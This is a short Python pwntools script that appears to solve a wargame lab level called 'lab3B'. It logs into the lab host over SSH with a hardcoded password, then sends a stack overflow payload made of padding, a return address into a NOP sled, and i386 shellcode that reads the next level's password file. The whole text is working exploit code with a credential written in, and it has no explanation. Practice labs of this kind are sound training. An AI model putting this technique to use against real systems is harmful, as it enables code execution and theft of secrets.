#!/usr/bin/env python3

from pwn import *

# SSH password : th3r3_iz_n0_4dm1ns_0n1y_U!
stack_base = 0xffffd5e0 # local
stack_base = 0xbffff6d0 # remote
stack_base = 0xbffffc80 # ssh

payload = ""
payload += "A" * 156 # Padding
payload += p32(stack_base + 50)
payload += p8(0x90) * 0x100
payload += asm(shellcraft.i386.cat("/home/lab3A/.pass"))

ip = ""
p = ssh("lab3B", ip, password="th3r3_iz_n0_4dm1ns_0n1y_U!")
shell = p.run("/bin/sh")
shell.sendline("/levels/lab03/lab3B")
shell.sendlineafter("just give me some shellcode, k", payload)
shell.interactive()
